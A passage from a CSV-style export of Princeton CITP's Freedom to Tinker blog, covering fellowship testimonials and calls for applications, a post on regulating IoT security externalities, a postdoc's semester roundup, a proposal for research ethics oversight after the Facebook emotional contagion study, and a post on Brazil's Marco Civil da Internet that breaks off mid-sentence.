interests in law, policy, ethics, and technological governance and engage with the social and economic impacts of technology at a national scale. In addition to gaining unique real-world experience and working on cutting-edge issues in the field, I found the PIT-SF fellowship particularly compelling because of its emphasis on mentorship, both from peers and experts in the field, which I believed would help me to grapple more meaningfully with issues I had previously only encountered in a classroom environment. Julia: I have long been attracted to and inspired by the Public Interest Technology (PIT) sphere which allows technologists, policymakers, activists, and experts in all fields to ensure that the technological era is just and that the incredible power tech offers is used for social good. As a student with interests in policy, programming, and social impact, I was thrilled to find the rare opportunity to make a difference, in an entry-level position, working on the problems I find most essential. The fellowship also offered the benefit of wisdom from the program’s leaders and guest speakers. Manish: PIT to me, at face value, means creating and using technology in responsible manners. Specifically, this term represents the mindset of always keeping social values and humanitarian ethics when designing sophisticated technological systems. I applied to this fellowship because it offered a unique opportunity to combine my love of technology for social good as well as gain insight into how government agencies deal with tech-related issues. How did the PIT-SF fellowship influence you? Julia: From CITP and the orientation for the fellowship, I learned about the wide range of policy issues central to regulating technology. The personal narratives that guest speakers and the program leaders shared provided assurance that there is no wrong way to join the PIT coalition and inspired me to follow the path that I feel drawn to instead of whatever may seem like the correct one. At MoCTO, I experienced the full range of what it means to work on local (city-wide) PIT efforts. From watching the design team navigate website accessibility to tracking global COVID-19 technical solutions to advocating for new legislation, my summer as a fellow has compelled me to enter a career in civil service at the same intersection into which MoCTO provided me a foray. I’ve had the privilege to continue working for MoCTO where I’ve begun to gain a deep and full understanding of the ways in which technology policy is written and passed into law. Thanks to the role models I found through MoCTO, I am now applying to law schools not only to become a lawyer, but to increase my comprehension of PIT. I learned by watching my supervisor and the rest of our team that a systematic and complete mastery of the technical logistics, the historical use, the social implications, and the legal context are all essential knowledge bases for those working in the PIT sphere. Meena: As a fellow working with the FTC, I worked on analyzing acquisitions by prominent technology companies. The process of acquisition analysis is one that combines both technical and qualitative skills, allowing me to uniquely leverage my multidisciplinary background to engage with the business structures, technological features, and post-acquisition implications of hundreds of companies. In addition to gaining a better understanding of investment and growth patterns in the tech sector, I developed a deeper understanding of the economic theories and laws underlying antitrust analysis through direct mentorship with experts in the field. At the culmination of my fellowship, my peers and I presented our findings to the OPP and received valuable feedback from senior leadership, which fueled my interest in the field of tech policy and guided me to follow cutting-edge trends in the applications of emerging technologies more closely. Through the course of the fellowship, CITP also offered incredible exposure to PIT niches outside of antitrust, empowering me to develop a greater understanding of both public and private sector perspectives and the broader issue landscape. During the bootcamp, fellows were invited to participate in meaningful discussions with industry leaders and senior experts across federal and local government, intelligence, law, and the technology sectors. This provided us with unique opportunities to understand the issues of privacy, equity and access, and algorithmic fairness not only through a regulatory lens, but also in terms of the technical, business, and ethical challenges that play a significant role in shaping PIT initiatives. Given the broad complexity of the PIT field and the evolving nature of professional exposure at the undergraduate level, the PIT-SF fellowship offered impressive and unparalleled real world experience that has contributed significantly to my pursuit of a career at the intersection of technology, law, and policy. Manish: During my fellowship at the CFPB, I worked on fair-lending models and this introduced me to the field that I wish to join full time: fairness in machine learning. Borne out of a need to create models that maintain equality with respect to various desirable features/metrics, fair-ml is an interdisciplinary topic that deals with both the algorithmic foundations as well as the real-world implications of fairness-aware machine learning systems. My fellowship directly introduced me to this field and, by the end of my stint at the CFPB, I compiled all of the knowledge I had amassed through a literature deep-dive in the form of a formal summary paper (linked here). Moreover, this fellowship gave me the necessary background for my current role of leading a research team based in Carnegie Mellon’s Human-Computer Interaction Institute (HCII) where the focus is on how industry practitioners formulate and solve fairness-related tasks. One of the best parts about this fellowship is that public interest technology itself is broad enough of a field to allow for extremely diverse experiences with one common thread: relevance. Every fellowship dealt with, in some capacity, a timely and cutting edge topic. Personally, the field of fair-ml has only been rigorously studied within the past decade, which allowed me to easily find the most important papers and people to read and reach out to, respectively. The ability to find both incredibly pertinent and also rather interesting work is an immediate consequence of my PIT-SF fellowship. Conclusion: We plan to invite approximately 16 students to this year program, which will operate in a hybrid format. Like last year, we begin with a virtual three-day policy bootcamp led by Mihir Kshirsagar and Tithi Chattopadhyay. The bootcamp will educate students about law and policy, and will feature leading experts as guest speakers in the fields of computer science and policy. After the bootcamp, fellows will travel to (or join virtually) the host government agencies in different cities that our program has matched them with to spend approximately eight weeks working with the agency. We will also have weekly virtual clinic-style seminars to support the fellows during their internships. At the conclusion of the summer, we aim to bring the 2021 and 2020 PIT-SF fellows for an in-person debriefing session in Princeton (subject to the latest health guidelines). CITP is committed to building a culturally diverse community, and we are interested in receiving applications from members of groups that have been historically underrepresented in this field. The deadline to apply is February 10, 2021 and the application is available here."
"425","2020-11-09","2023-03-24","https://freedom-to-tinker.com/2020/11/09/citp-call-for-the-postdoctoral-track-of-the-citp-fellows-program-2021-22/","The Center for Information Technology Policy (CITP) is an interdisciplinary center at Princeton University. The center is a nexus of expertise in technology, engineering, public policy, and the social sciences on campus. In keeping with the strong University tradition of service, the center’s research, teaching, and events address digital technologies as they interact with society. CITP is seeking applications for the postdoctoral track of the CITP Fellows Program for 2021-22. It is for people that have recently received a Ph.D. in fields such as computer science, sociology, economics, political science, psychology, public policy, information science, communication, philosophy, and other related technology policy disciplines. In this application cycle, we especially welcome applicants with interests in: Artificial Intelligence (AI), Data Science, Blockchain, and Cryptocurrencies. The goals of this fully-funded, in-residence program are to support people doing important research and policy engagement related to the center’s mission and to enrich the center’s intellectual life. Fellows typically will conduct research with members of the center’s community and engage in the center’s public programs. The Fellows Program provides freedom to pursue projects of interest and a stimulating intellectual environment. Application review will begin in the middle of December 2020. For more information about these positions, please see our Fellows Program webpage. If you’d like to go directly to the application, please click here."
"426","2019-08-13","2023-03-24","https://freedom-to-tinker.com/2019/08/13/selling-a-single-item-with-negative-externality/","By Matheus V. X. Ferreira, Danny Yuxing Huang, Tithi Chattopadhyay, Nick Feamster, and S. Matthew Weinberg Recent years have seen a proliferation of “smart-home” or IoT devices, many of which are known to contain security vulnerabilities that have been exploited to launch high-profile attacks and disrupt Internet-wide services such as Twitter and Reddit. The sellers (e.g., manufacturers) and buyers (e.g., consumers) of such devices could improve their security, but there is little incentive to do so. For the sellers, implementing security features on IoT devices, such as using encryption or having no default passwords, could introduce extra engineering cost. Similarly, security practices, such as regularly updating the firmware or using complex and difficult-to-remember passwords, may be a costly endeavor for many buyers. As a result, sellers and buyers security practices are less than optimal, and this ends up increasing vulnerabilities that ultimately impact other buyers. In other words, their actions cause a negative externality to other buyers. This scenario where individuals act according to their own self-interest on detrimental to the common good is referred to as the tragedy of the commons. One approach to incentivize agents to adopt optimal practices is through external regulations. In this blog post, we discuss two potential approaches that a regulator may adopt in the case of IoT security: Regulating the seller – requiring minimum security standards on sellers of IoT devices; Regulating the buyer – and/or encouraging IoT device buyers to adopt security practices through rewards (e.g., ISP discounts for buyers without signs of malicious network traffic) or penalties (e.g., fines for buyers of devices that engaged in DDoS attacks). The goal of this hypothetical regulator is to minimize the negative externality due to compromised devices while maximizing the profitability of device manufacturers. We show that in some cases if buyers are rewarded for security practices (or penalized for the lack thereof), sellers can potentially earn higher profits if they implement extra security features on their devices. Challenges in regulation The hypothetical regulator’s ability to achieve the goal of minimizing negative externality depends on whether buyers can secure their devices more efficiently than sellers. If, for instance, buyers regularly update their devices’ firmware or set strong passwords, then regulating the sellers alone can be costly — i.e., inefficient. On the other hand, rewarding buyers for security practices (or penalizing them for the lack thereof) can still be inefficient if there is little buyers can do to improve security, or if they cannot distinguish good vs bad security practices. These challenges lead us to explore the impact the efficiency of buyers in improving their security has on regulatory effectiveness. Modeling the efficiency of buyers’ security practices A stochastic model captures the uncertainty of the efficiency of the buyer’s security practices when incentivized through regulation. A buyer has low efficiency when improving their effort towards security has a low impact in actually reducing security risks than if the same effort came from sellers. On the other hand, a buyer has high efficiency if improving their effort towards higher security translates in high improvements in security. As an example, consider the buyer’s efficiency in a system where users (i.e., buyers) log into a website using passwords. Let’s first make two assumptions: We first assume that the website is secure. The probability of a user’s account being compromised depends on, for instance, how strong the password is. A weak password or a reused password is likely correlated with a high chance of the account being stolen; on the other hand, a strong, random password is correlated with the opposite. We say that the users/buyers are highly efficient in providing security with respect to the website operator (i.e., seller); in this case, efficiency > 1. Figure 1-a shows an example of the distribution of the buyers’ efficiency. We next assume that the website is not secure — e.g., running outdated server software. The probability of a buyer’s account being compromised depends less on password strength, for instance, but rather more on how insecure the website server is; in this case, efficiency < 1. Figure 1-b shows an example of the distribution of the buyers’ efficiency. In reality, Assumptions (1) and (2) rarely exist in isolation but rather coexist in various degrees. We show an example of such in Figure 1-c. Figure 1 The same model can be used to study scenarios where the actions of different agents cause externalities to common goods such as clean air. Regulatory policies in a market of polluting cars often focus on regulating the production of vehicles (i.e., sellers). Once a car is purchased, there is little the buyer can do to lower pollution besides regular maintenance of the vehicle. In this case, the buyer’s efficiency would resemble Figure 1-b. In the other extreme, in government (i.e., sellers) auctions of oil exploration licenses, firms (i.e., buyers) are regulated and fined for potential environmental impacts. When comparing the efficiency of the government vs. the efficiency of firms, firms are in a better position in adopting better practices and controlling the environmental impacts of their activities. The firms’ efficiency would resemble Figure 1-a. Regulatory Impact on Manufacturer Profit Another consideration for any regulator is the impact these regulations have on the profitability of a manufacturer. Any regulation will directly (through higher production cost) or indirectly impact the sellers’ profit. By creating economic incentives for buyers to adopt better practices through fines (or taxes), we indirectly affect the prices a buyer is willing to pay for a product. In Figure 2, we plot the maximum profit a seller can acquire in expectation from a population of buyers such that: buyer’s value for the IoT device is drawn uniformly between $0 and $20; efficiency is uniform [0,1], [0,3] and [2, 3]; a regulator imposes on buyers a fine ranging from $0 to $10 and/or impose on sellers minimum production cost ranging from $0 to $5 (e.g., for investing in extra security/safety features). If buyers have low efficiency (Figure 2-a) and they are liable for the externalities caused by their devices, regulating the sellers can, in fact, increase the manufacturer’s profit since the regulation reduces the chance buyers are compromised. As buyers become more efficient (Figure 2-b and then 2-c), regulating the sellers can only lower profit since they prefer to provide security themselves. Figure 2 Selecting the Best Regulation To select the optimal regulatory strategy when constrained by minimum profit impact on sellers, we must understand the distribution of efficiency of buyers. We show that in homogeneous markets where buyer’s ability to follow security practices is always high or always low (Figure 1-a and 1-b) — the optimal regulatory policy would be to regulate only the buyers or the sellers. In arbitrary markets where buyer’s ability to follow security practices can have high variance (Figure 1-c), by contrast, we show that while the optimal policy may require regulating both buyers and sellers, there is always an approximately optimal policy which regulates just one. In other words, although an efficient regulation might be required to regulate both buyers and sellers, considering policies that either only creates incentives for buyers or only regulate the seller can approximate the optimal policy that potentially intervenes on both buyers and sellers. In practice, it is challenging to completely infer all the features that can affect the efficiency of buyers — that is, precisely measure efficiency distributions Figure 1-a to 1-c. Our theoretical results provide a tool for security researchers to infer an approximately optimal regulation from an inaccurate model of the efficiency distribution. By estimating that most of the population that purchase a device is highly efficient, we have shown that regulating only the buyer is approximately optimal. On the other hand, by estimating that the population that purchases a device is highly inefficient, regulating only the seller approximates the optimal regulation. At the end of the day, by better understanding the efficiency of buyer’s security practices, we will be in a better position to make a decision about regulatory strategies for different information technology markets such as for the market of IoT devices without the need for complex regulation. For more details, the full paper can be accessed at https://arxiv.org/abs/1902.10008 which was presented at The Web Conference 2019."
"427","2018-01-11","2023-03-24","https://freedom-to-tinker.com/2018/01/11/roundup-my-first-semester-as-a-post-doc-at-princeton/","As Princeton thaws from under last week’s snow hurricane, I’m taking a moment to reflect on my first four months in the place I now call home. This roundup post shares highlights from my first semester as a post-doc in Psychology, CITP, and Sociology. Here in Princeton, I’m surviving winter in the best way I know how 🙂 So far, I have had an amazing experience: The Paluck Lab (Psychology) and the Center for IT Policy, my main anchor points at Princeton, have been welcoming and supportive. When colleagues from both departments showed up at my IgNobel Prize viewing party in my first month, I knew I had found a good home <grin> The Paluck Lab have become a wonderful research family, and they even did the LEGO duck challenge together with me! Weekly lab meetings with the Paluck Lab have been a master-class in thinking about the relationship between research design and theory in the social sciences. I am so grateful to observe and participate in these conversations, since so much about research is unspoken, tacit knowledge. With the help of my new colleagues, I’ve started to learn how to write papers for general science journals. I’ve also learned more about publishing in the field of psychology. At CITP, I’ve learned much about thinking simultaneously as a regulator and computer scientist. I’ve deeply enjoyed my conversations with the whole crew at CITP. I’ve also come to value Ed Felten’s masterful approach to bridging complex technical and regulatory topics with clarity. I’ve definitely stolen some of his rhetorical strategies in my own talks. Apply to be an IT Policy Researcher at Princeton (their word for postdoc) and join us next year (application)! I’ve loved the conversations at the Kahneman-Treisman Center for Behavioral Policy, where I am now an affiliated postdoc I’m looking forward to meeting more of my colleagues in Sociology this spring, now that I’ll be physically based in Princeton more consistently Travel and Speaking View of the French Alps from Lausanne I also enjoyed some amazing, meaningful travel: a week in Guatemala (my family is from Guatemala) giving a keynote at the Latin-American HCI conference and supporting computer science and social undergraduates and gradstudents. I plan to write more about this amazing experience soon. lectures and seminars in London and Oxford on Christianity and Artificial Intelligence with laypeople, ministers, researchers, and leaders of Christian denominations a keynote panel at the Connected 150 Conference on Digital Citizenship in Ottawa a week in San Francisco, including two talks at Stanford, alongside talks at Facebook, Twitter, and Disqus a trip to Aspen (gorgeous!) for the Aspen Institute roundtable on AI a few days back in Boston to present research at CODE@MIT on “Community-Led Platform Governance Experiments“ talks at the Internet Governance Forum at the UN building in Geneva on violence against women online(video) and another talk, organized by the Digital Asia forum on the use of AI in internet governance A week in Colombo, Sri Lanka at the Global Voices Citizen Media Summit <3 An evening in my hometown coffeeshop hearing live music and catching up with longtime friends I’m so glad that I can scale down my travel this spring, phew! A flock of birds takes flight in Antigua, Guatemala Writing and Research I’ve submitted papers for publication; some were accepted CHI 2018 accepted my paper with Merry Mou on Community-Led Experiments in Platform Governance Gantman, A., Gomila, R., Martinez, J.E., Matias, J.N., Paluck, E.L., Starck, J., Wu, S. & Yaffe, N. (in press). A pragmatist philosophy of psychological science and its implications for replication: Commentary on Zwaan et al. Brain and Behavioral Sciences. (several more are under review or about to be submitted) I got to design a class on field experiments for undergrads and master’s students that I’m extremely excited to teach this spring I got to advise the remarkably-talented Jonathan Zong on a project to re-design online research ethics procedures Looking back, I realized that I blogged a lot more than I realized: A seven-part series on Christianity and AI with Scott Hale, Lydia Manikonda, and Ken Arnold A two-part series on how to audit Facebook’s News Feed: How Anyone Can Audit Facebook’s News Feed Attributing Cause in Algorithm Audits Position statements: Algorithmic Consumer Protection The Benefits of Massively-Scaling Platform Research and Accountability Trip reports: Citizen Autonomy and Machine Intelligence: Reflections from the Aspen Institute Roundtable on AI Research reports: Remaking Large-Scale Behavioral Research for Democracy: New Paper at CHI 2018 Do Downvote Buttons Cause Unruly Online Behavior? 3 Strategies for Accountable, Ethical Online Behavior Research Citizen Behavioral Design: CivilServant Selected as an Innovation by Design Award Finalist (I later won the Tischler Award) Community Outreach (several posts) Liveblogs of talks at Princeton: Bias and Noise: Daniel Kahneman on Errors in Decision-Making How Would You Design Crypto Backdoor Regulation? Ed Felten at CITP AI Mental Health Care Risks, Benefits, and Oversight: Adam Miner at Princeton What Should the Information Society Be? Luciano Floridi at Princeton The Cost of Partial Altruism: Oriana Bandiera at Princeton Princeton Life Things that the town of Princeton has: fantastic local ice cream an amazing Guatemalan restaurant farm stores with fresh food and live music I’ve been made a fellow at Mathey College and am thoroughly enjoying dinners and events with my partner Dr. H, students, and other fellows. I’ll be giving a lunch talk this spring and may organize an occasional classics reading group with Dr. H. I’m making life work without a car, taking advantage of my cyclocross bike, an excellent trailer, all-weather gear, a bicycle commute subsidy, and Princeton’s car share program I’m back to writing at a cycling desk Rockefeller College Cloisters, Princeton. On evenings when I have dinner here, I walk through these cloisters on my way hime."
"428","2016-11-09","2023-03-24","https://freedom-to-tinker.com/2016/11/09/citp-call-for-visitors-and-affiliates-for-2017-18/","The Center for Information Technology Policy is an interdisciplinary research center at Princeton that sits at the crossroads of engineering, the social sciences, law, and policy. We are seeking applicants for various residential visiting positions and for non-residential affiliates. For more information about these positions, please see our general information page and yearly call for applications and our lists of current and past visitors. We are happy to hear from anyone working at the intersection of digital technology and public life, including experts in computer science, sociology, economics, law, political science, public policy, information studies, communication, and other related disciplines. We have a particular interest this year in candidates working on issues related to Interconnection, the Internet of Things (IoT), and the ethics of big data and algorithms. Visitors All visitors must apply online through the Jobs at Princeton site. There are three job postings for CITP visitors: 1) the Microsoft Visiting Professor of Information Technology Policy, 2) Visiting IT Policy Fellow, and 3) IT Policy Researcher. A Visiting IT Policy Fellow is on leave from a full-time position (for example, a professor on sabbatical); an IT Policy Researcher will have Princeton University as the primary affiliation during the visit to CITP (for example, a postdoctoral researcher or a professional visiting for a year between jobs). As such, applicants should apply to only one of the Visiting IT Policy Fellow position or the IT Policy Researcher position as appropriate; applicants to either position may also apply to be the Microsoft Visiting Professor. For all visitors, we are happy to hear from anyone working at the intersection of digital technology and public life, including experts in computer science, sociology, economics, law, political science, public policy, information studies, communication, and other related disciplines. Applicants should submit a current curriculum vitae, a research plan (including a description of potential courses to be taught if applying for the Visiting Professorship), and a cover letter describing background, interest in the program, and any funding support for the visit. CITP has secured limited resources from a range of sources to support visitors. However, many of our visitors are on paid sabbatical from their own institutions or otherwise provide some or all of their own outside funding. Microsoft Visiting Professor of Information Technology Policy The successful applicant must possess at least a bachelor’s degree and will be appointed to a ten-month term, beginning September 1st, with the possibility of renewal for a second year. The Visiting Professor must teach one course in technology policy per academic year. Preference will be given to current or past professors in related fields and to nationally or internationally recognized experts in technology policy. The application process for the Microsoft Visiting Professor of Information Technology position is generally open from November through the end of January for the upcoming year. To apply to become the Microsoft Visiting Professor, please go to Jobs at Princeton, click on “Search Open Positions,” and enter requisition number 1600994. Visiting IT Policy Fellow; IT Policy Researcher The successful applicant must possess an advanced degree and typically will be appointed to a nine- to twelve-month term, beginning September 1st. These visitors may teach a seminar if desired, subject to the approval of the Dean of the Faculty. We encourage candidates at all levels to apply. As noted above, candidates should apply to either the Visiting IT Policy Fellow position (if they will be on leave from a full-time position) or the IT Policy Researcher position (if not). Please do not apply to both listings. Full consideration for the Visiting IT Policy Fellow and IT Policy Researcher positions is given to those who apply from November through the end of January for the upcoming year. To apply to become a Visiting IT Policy Fellow, please go to Jobs at Princeton, click on “Search Open Positions,” and enter requisition number 1600996. To apply to become an IT Policy Researcher, enter requisition number 1600995. Princeton University is an Equal Opportunity/Affirmative Action employer and all qualified applicants will receive consideration for employment without regard to age, race, color, religion, sex, sexual orientation, gender identity or expression, national origin, disability status, protected veteran status, or any other characteristic protected by law. All offers and appointments are subject to review and approval by the Dean of the Faculty. Affiliates Technology policy researchers and experts who wish to have an affiliation with CITP, but cannot be in residence in Princeton, may apply to become a CITP Affiliate. The affiliation typically will last for two years. Affiliates do not have any formal appointment at Princeton University. Applicants should email applications to *protected email* between November and the end of January for affiliations beginning the following academic year. Please send a current curriculum vitae and a cover letter describing background and interest in the program."
"429","2014-07-07","2023-03-24","https://freedom-to-tinker.com/2014/07/07/after-the-facebook-emotional-contagion-experiment-a-proposal-for-a-positive-path-forward/","Now that some of the furor over the Facebook emotional contagion experiment has passed, it is time for us to decide what should happen next. The public backlash has the potential to drive a wedge between the tech industry and the social science research community. This would be a loss for everyone: tech companies, academia, and the public. In the age of big data, the interaction between social scientists and tech companies could yield a richer understanding of human behavior and new ideas about how to solve some of society’s most important problems. Given these opportunities, we must develop a framework within which this research can continue, but continue in a responsible way. I think that tech companies — in collaboration with other stakeholders — should develop Human-Subjects Research Oversight Committees (HSROCs) that would review, improve, and ultimately accept or reject plans for human-subjects research, much like the Institutional Review Boards (IRBs) that exist at U.S. universities. Based on my own experience conducting online experiments, serving on the Princeton University IRB, and working at a tech company — I’m currently an employee of Microsoft Research while on leave from Princeton — I’ve developed five principles that I think should govern tech companies’ HSROCs. Before describing these principles, I think it worthwhile to quickly review some of the history of human-subjects research and the current practices in the tech industry; any consideration of what to do going forward should be informed by the past and present. First, we must acknowledge that scientists have done awful things to other people, all in the name of research. This history is real; it should not be ignored; and it creates a legitimate demand for ethical oversight of human-subjects research. In response to past ethical failures, researchers have developed basic principles that can guide research involving human subjects: the Nuremberg Code (1949), the Declaration of Helsinki (1964), and most recently the Belmont Report (1978). Building on the Belmont Report, the U.S. government created the Federal Policy for the Protection of Human Subjects — known as the “Common Rule” — which governs research funded by the federal government and therefore governs IRBs at U.S. universities. Tech companies, however, because their research is not federally funded, are not governed by the Common Rule and do not have IRBs. Currently, the practices governing the design, implementation, and publication of human-subjects research differ across tech companies, and these practices are not transparent. This state of affairs is not surprising because the conduct of social science research within tech companies is relatively new. Further, many of the researchers inside tech companies were trained in computer science and engineering — not in the social sciences — so they have little prior experience with the ethical dilemmas of human-subjects research. Given that background, the five principles that I propose for HSROCs are: 1) restricted in scope, 2) focused on balancing risks and benefits, 3) transparent, 4) dynamic, and 5) diverse. Restricted in scope The single most important decision about HSROCs is defining their scope. I believe that they should cover all “human-subjects research.” Because this definition is so critical, let me be very explicit. I would propose that HSROCs adopt the definition of “human-subjects research” proposed in a recent National Research Council report: Human-subjects research is systematic investigation designed to develop or contribute to generalizable knowledge by obtaining data about a living individual directly through interaction or intervention or by obtaining identifiable private information about an individual. Critically, this definition also clarifies what is not human-subjects research, and two points are worth highlighting. First, human-subjects research must involve human subjects (“obtaining data about a living individual”). Therefore, research on topics like quantum computers or fault-tolerant algorithms would not be under the purview of HSROCs. As best I can tell, much of the published research currently conducted at Microsoft, Google, Twitter, LinkedIn, and Facebook does not involve human subjects, although the proportion varies from company to company. Second, under this definition, human-subjects research must be “designed to develop or contribute to generalizable knowledge,” which most likely would exclude experiments conducted to address business questions specific to a single company. For example, Google’s experiment to see which of 41 shades of blue would increase click through rates is business research, not scientific research seeking “generalizable knowledge.” In other words, this definition of human-subjects research makes a distinction between scientific research — which seeks generalizable knowledge — and what I would call business research — which seeks actionable information for a single company. Because scope specification is so important and because drawing the line in the way I propose excludes almost all activities happening inside of tech companies right now, I’d like to address several possible objections. First, critics might argue that this restricted scope does not address the real dangers posed by technology companies and their power over us. And, I would agree. The concentration of data and power inside of companies with little ethical oversight is problematic. However, it is worth pointing out that this issue is larger than tech companies: political campaigns, credit card companies, and casinos all use massive amounts of data and controlled experimentation in order to change our behavior. As a society we should address this issue, but developing oversight systems for business research is beyond the scope of this modest proposal. Second, some might object to the fact that this proposal would unfairly place stronger ethical controls on scientific research than business research. It is true that HSROCs would create a dual system inside of companies, but I think it is important for people involved in scientific research to play by a higher set of rules. Society grants scientists great privileges because they are deemed to be working for the creation of knowledge in service of the common good, and we should not be in an ethical race to the bottom. In fact, strong ethical procedures governing scientific research inside of companies might eventually serve as a model for procedures governing business research. A third critique is that the line between scientific research and business research is blurry and that companies could circumvent HSROCs by merely relabeling their research. This is certainly possible, but one of the responsibilities of HSROCs would be to clarify this boundary, much as university IRBs have developed an extensive set of guidelines clarifying what research is exempt from IRB review. Acknowledging these limitations, I would like to describe two benefits of making HSROCs restricted in scope. First, it is consistent with the existing ethical norms governing human-subjects research. In fact, the first section of the Belmont Report — the report which served as a basis for the rules governing university IRBs — explicitly sets boundaries between “practice” and “research” (although in the context of medical research). A second benefit of a restricted scope is that it increases the chance of voluntary adoption by tech companies. Focused on balancing risks and benefits Like IRBs, HSROCs should help researchers balance the risk and benefit in human-subjects research. One important but subtle point about balance is that it does not require the elimination of all risk. However, research involving more than “minimal risk” — the risks that participants would experience in their everyday life — requires stronger justifications of benefits to participants and society more generally. When presented with a research plan that does not strike an appropriate balance between risks and benefits, an HSROC could stop the project completely or could require modifications that would yield a better balance. For example, an HSROC could require that a specific project exclude participants under 18 years old. In addition to changes that help decrease risk, an HSROC could also require changes that increase benefit. For example, an HSROC could require that the resulting research be published open access so that everyone in society can benefit from it, not just people at institutions that provide access to costly academic journals. I think that a strong emphasis on open access publication is one way that industrial HSROCs could provide strong leadership for university IRBs. Transparent Facebook has research oversight procedures that were put into place some time after the emotional contagion study was conducted in 2012. Here’s what the Wall Street Journal reported: Facebook said that since the study on emotions, it has implemented stricter guidelines on Data Science team research. Since at least the beginning of this year, research beyond routine product testing is reviewed by a panel drawn from a group of 50 internal experts in fields such as privacy and data security. Facebook declined to name them. Company research intended to be published in academic journals receives additional review from in-house experts on academic research. Some of those experts are also on the Data Science team, Facebook said, declining to name the members of that panel. Secret procedures followed by unnamed people will not have legitimacy with the public or the academic community, no matter how excellent those procedures might be. The secret nature of the process at Facebook contrasts with university IRBs: all have extensive websites that are accessible to everyone, both inside the university and outside. (Here’s the website of the Princeton IRB, for example). At a minimum, HSROCs should make their meeting schedule, guiding documents, and names of committee members publicly available through similar websites. In addition to creating legitimacy, transparency would also represent a contribution to the wider scientific community because the procedures of HSROCs could help university IRBs. In fact, my guess is that many university IRBs would love to learn about the Facebook review system in order to improve their own systems governing online research. Dynamic HSROCs should be designed in a way that enables them to change at the pace of technology, something that university IRBs do not do. The Common Rule, which governs university IRBs, was formally enacted in 1991, and it took 20 years before the Department of Health and Human Services began the process of updating the rules. Further, this process of updating the Common Rule, which began in 2011, is still not complete. Changing federal regulations is complicated, so I appreciate the need for these processes to be cautious and consultative. However, the HSROCs must be able to adapt more quickly. For example, user expectations about data collection, retention, and secondary use will probably change substantially in the next few years, and this evolution of user expectation will create the need for changes in the kinds of consent and debriefing that HSROCs require. Diverse When you take away all the technical language and bureaucracy, a university IRB is just a bunch of people sitting in a room trying to make a decision. Therefore, it is critical that diverse experiences and views are represented in the room. As per the Common Rule guidelines on membership, the Princeton IRB has a mix of faculty, staff, and members of the wider community (e.g., a physician, a member of the clergy). My experience has been that these members of the community provide a great benefit to our discussions. Any review board within a tech company should include people with different backgrounds, training, and experience. It should also include people who are not employees of the company. Turning these five principles — restricted in scope, focused on balancing risks and benefits, transparent, dynamic, and diverse — into a concrete set of rules and standards for an HSROC would involve a lot of careful thought, and I imagine that, at least initially, HSROCs would vary from company to company. However, as I hope this post has demonstrated, it is possible to bring ethical oversight to scientific research involving tech companies (or companies in any industry) without requiring radical changes to the business practices of these companies. The promise of social research in the digital age comes with a dark side. Our increased ability to collect, store, and analyze data, which can enable us to learn so much, can also increase the harm that we can cause. I predict that if there are no oversight systems put into place, we will likely see ethical lapses as serious as the Milgram obedience experiment or the Stanford prison experiment, but rather than involving dozens of people, these Internet-scale lapses could harm millions of people. There are a lot of hard decisions that need to be made going forward. What forms of consent and debriefing should be required for online experiments? Does the dramatically different scale of online experimentation require rethinking of existing concepts such as “minimal risk”? What research is permissible with the terabytes of non-experimental data generated by users every day? All of these decisions will be made, either explicitly or implicitly, and they will be made by people just like you and me. The difficulty of these decisions means that we should develop institutions that will enable us, as a community, to make these decisions wisely."
"430","2014-02-18","2023-03-24","https://freedom-to-tinker.com/2014/02/18/e-agora-jose-the-current-status-of-marco-civil-da-internet/","I hope non-Brazilian readers will forgive me, but I could not find a better expression to summarize the current situation of the Brazilian Marco Civil da Internet. “E agora, José?” The expression can be translated into English as “What now, José?”, and is quite popular in Brazil, having its origin in a famous poem by Carlos Drummond de Andrade (1902-1987). Although it might carry different meanings, this expression is mainly used in hard times, when people are challenged by a situation in which desirable or ideal solutions just seem impossible. When puzzled by a conundrum, one might say: “E agora, José?”. Here I will try to explain why I do think that the Marco Civil is facing such a situation. But first, we need some background. Marco Civil background. Marco Civil is the Brazilian regulatory framework to the Internetin Brazil. It was initially developed as a “Bill of Rights” by the initiative of the Ministry of Justice in partnership with FGV Law School having strong participation of CGI.br (Brazilian Internet Steering Committee). The drafting of the document was quite open to multiple stakeholders; in its first phase, the project received more than 800 contributions through the website [port] launched for this purpose. In the second phase, the draft was discussed in public debates and meetings that occurred throughout the year 2010 until it was formally presented as a law project to the House of Representatives in August 2011.The first version of the Marco civil has been widely recognized as a result of a truly open and collaborative process; a model that should be followed by other initiatives in the field of technology governance. If approved, an important achievement of Marco Civil would be the enforcement of principles 6th and 7th from CGI’s list of principles: network neutrality and unaccountability of the network. These principles are strongly supported by civil society organizations that promote internet freedom. Unfortunately, the vote on the law project has been constantly postponed ever since it was presented two and half years ago. Telecommunication companies have been lobbying against the “net neutrality” principle and communication conglomerates were trying to include notice-and-takedown mechanisms. The House of Representatives has alleged “lack of consensus”, in order not to vote on the project. Right after Snowden’s revelations about NSA spying on Brazil, President Rousseff gave special attention to the project that became a “constitutional priority”. This means that any other law project cannot be voted until the voting of the Marco Civil. Finally, it seemed that the problem would be solved with the Executive Power pushing forward the approval. But the Telecom lobby is showing its power of influence and the result is that the House of Representatives agenda has been blocked since October 2013. Even worse: in the Government’s effort to convince the opposition and construct alliances inside the House of Representatives, the project has suffered some important changes that lead us now to the situation “E agora, José?” Marco civil problematic changes: The first important (and controversial) modification is an amendment requiring that all data collected locally about Brazilian citizens and companies must be stored in Brazil. This amendment was made in November 2013 within the context of Snowden’s revelations and might be understood as a measure to preserve Brazilian citizen’s privacy against espionage and surveillance attempts. In this perspective data collected (thus stored) in Brazil would be protected under the country’s legal framework. But the measure is technically inefficient against espionage and, besides, raises several questions about its actual feasibility [port]. In fact, it is clear that this amendment goes against the very international nature of the Internet which is recognized by the Marco Civil itself. Other two versions of the Law Project have been released after that, the first one in December 2013 and the second one a couple of days ago, on February 12th, 2014. The changes made are causing strong reactions from civil society organizations especially the ones that have heavily contributed in its first phase. In short, the current version of the Marco Civil establish that internet application providers “who exercise their activities in an organized, professional and economic way” must retain the access records during the period of six months, with the possibility to extend this period in the case of court order or public prosecutor’s requirement.Within the original version, that modality of data retention was optional and should be restricted specifically to the application provided. Now, some analysts [port] are arguing that the application providers may also retain the user internet connection records (like connection time, duration and location). Then, the Marco Civil has become less efficient in protecting privacy, what is clearly a step back happening in the moment in which the European Union Court states that data retention constitutes a serious interference with the fundamental right of citizens to privacy. Another modification in the text is allowing the mechanism of notice and takedown with regard to contents of sex and/or nudity. The intent would be to protect the privacy and intimacy of people that inadvertently have had their own intimate images published on the web. But the way in which the article (22th) was originally written in the version of December/2013 has opened up the possibility to any person (not only the ones that have had their intimacy 